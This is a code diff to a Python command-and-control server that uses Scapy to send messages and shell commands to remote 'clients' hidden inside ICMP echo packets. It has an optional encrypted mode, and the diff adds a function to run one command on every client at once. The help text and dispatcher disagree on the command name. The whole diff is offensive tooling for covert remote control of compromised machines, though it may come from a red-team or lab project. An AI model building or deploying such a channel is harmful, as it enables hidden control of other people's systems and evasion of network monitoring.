@@ -27,7 +27,7 @@ def print_help():
     print("\tsend <ID> <message>      Send message to client at ID")
     print("\texe <ID> <command>       Send command to client at ID")
     print("\tsendtoall <message>      Sends <message> to all clients")
-    print("\texetoall <command>       Execute <command> on all clients")
+    print("\texeonall <command>       Execute <command> on all clients")
     print("\tloadclients              Loads all clients specified in JSONFILE")
     # print("\tshell <ID>               Creates a direct line with client at ID")
     print("\tkill                     Stops server")
@@ -111,13 +111,23 @@ def send_over_icmp(clientip, command, execute):
             clientcommand = "!!!$0" + encrypted
         else:
             clientcommand = "!!!00" + command
-            
+    
     evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     send(evil)
 
 # TODO Execute on all clients
 # Send command to all clients
 def sendtoall(arguments, clients, execute):
+    global SuperSecretMode
+    if len(arguments)<2 or arguments[1] == "": 
+        print("[ERROR] Usage: sendtoall <message>")
+    else:
+        for client in clients:
+            send_over_icmp(clients.get(client), arguments[1], execute)
+            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
+            elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+
+def exeonall(arguments, clients, execute):
     global SuperSecretMode
     if len(arguments)<2 or arguments[1] == "": 
         print("[ERROR] Usage: sendtoall <message>")
@@ -220,6 +230,8 @@ def main():
             sendtoall(arguments, clients, execute=True)
         elif arguments[0] == "sendtoall":
             sendtoall(arguments, clients, execute=False)
+        elif arguments[0] == "exetoall":
+            exeonall(arguments, clients, execute=True)
         elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
         # elif arguments[0] == "shell":
